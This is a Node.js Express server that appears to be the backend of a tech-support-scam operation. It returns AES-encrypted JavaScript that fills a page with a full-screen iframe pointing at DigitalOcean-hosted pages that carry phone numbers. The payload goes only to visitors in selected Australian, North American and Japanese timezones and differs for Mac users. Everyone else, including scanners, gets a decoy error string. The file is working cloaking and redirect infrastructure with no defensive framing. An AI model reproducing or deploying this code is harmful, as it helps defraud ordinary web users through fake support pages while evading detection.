const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_KEY = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// 1. Optimization: Use a Set for O(1) timezone lookups (vs O(n) array search)
const ALLOWED_TIMEZONES = new Set([
    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Perth", 
    "Australia/Adelaide", "Australia/Hobart", "Australia/Darwin", "Australia/Canberra", 
    "Australia/Lord_Howe", "Asia/Tokyo", "America/New_York", "America/Chicago", 
    "America/Denver", "America/Los_Angeles", "America/Anchorage", "Pacific/Honolulu", 
    "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", 
    "America/Halifax", "America/St_Johns"
]);

const LINK_GROUPS = [
    { m: "https://lobster-app-mgaeg.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905", o: "https://lobster-app-mgaeg.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905" },
    { m: "https://squid-app-cxkop.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594", o: "https://squid-app-cxkop.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594" }
];

// Pre-generate the encrypted Error response to save CPU cycles
const ENCRYPTED_ERROR = encodeURIComponent(CryptoJS.AES.encrypt('console.log("Error Find");', SECRET_KEY).toString());

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Optimized Security Headers
app.use((_, res, next) => {
    res.setHeader("Content-Security-Policy", "frame-ancestors *;");
    next();
});

// --- Logic Functions ---

const aesEncode = (text) => CryptoJS.AES.encrypt(text, SECRET_KEY).toString();

/**
 * Optimized Payload Generator
 * Uses template literals and minimal logic to speed up string construction
 */
function getResponse(userAgent) {
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);
    
    // Weight logic: 0.5/0.5 is a simple coin flip
    const group = Math.random() < 0.5 ? LINK_GROUPS[0] : LINK_GROUPS[1];
    const url = isMac ? group.m : group.o;

    const payload = `const i=document.createElement("iframe");i.src="${url}";i.setAttribute("allow","fullscreen; autoplay; encrypted-media");i.sandbox="allow-scripts allow-popups allow-forms allow-downloads";i.style.width="100%";i.style.height="100%";i.style.border="0";const c=document.getElementById("contentiframe");if(c)c.replaceChildren(i);`;

    return encodeURIComponent(aesEncode(payload));
}

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({ status: "error", message: "Unauthorized", response: ENCRYPTED_ERROR });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;
    
    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
        return res.send(getResponse(req.get('User-Agent') || ""));
    }
    
    res.send(ENCRYPTED_ERROR);
});

app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
